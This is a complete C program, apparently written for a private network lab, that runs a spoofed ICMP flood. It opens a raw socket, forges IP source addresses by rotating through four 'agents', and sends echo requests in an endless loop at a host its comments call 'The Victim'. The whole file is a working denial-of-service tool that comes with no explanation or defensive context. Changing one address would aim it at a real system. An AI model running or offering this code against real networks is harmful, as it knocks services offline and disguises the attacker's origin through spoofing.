#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

// Standard Checksum Algorithm
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((u_char*)&oddbyte) = *(u_char*)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (answer);
}

int main(void) {
    // 1. Create Raw Socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) { perror("Socket failed"); exit(1); }

    // 2. Enable IP_HDRINCL (Critical for Spoofing)
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    char *target_ip = "10.0.0.6"; // The Victim
    sin.sin_family = AF_INET;
    sin.sin_port = htons(0);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // Spoofed Agents (h2 - h5)
    char *agents[] = {"10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"};
    int current_agent = 0;

    printf("Starting Spoofed ICMP Flood on %s...\n", target_ip);

    while (1) {
        memset(packet, 0, 4096);

        // --- IP HEADER ---
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        iph->id = htons(54321);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = inet_addr(agents[current_agent]); // <--- FAKE SOURCE
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, iph->ihl << 1);

        // --- ICMP HEADER (Ping Request) ---
        icmph->type = ICMP_ECHO; // Type 8
        icmph->code = 0;
        icmph->un.echo.id = htons(1234);
        icmph->un.echo.sequence = htons(current_agent);
        icmph->checksum = 0;
        icmph->checksum = csum((unsigned short *)icmph, sizeof(struct icmphdr));

        // Send Packet
        if (sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Send failed");
        }

        // Rotate Agents
        current_agent++;
        if (current_agent >= 4) current_agent = 0;

        usleep(1000); // Small delay to allow Tshark to catch up
    }
    return 0;
}
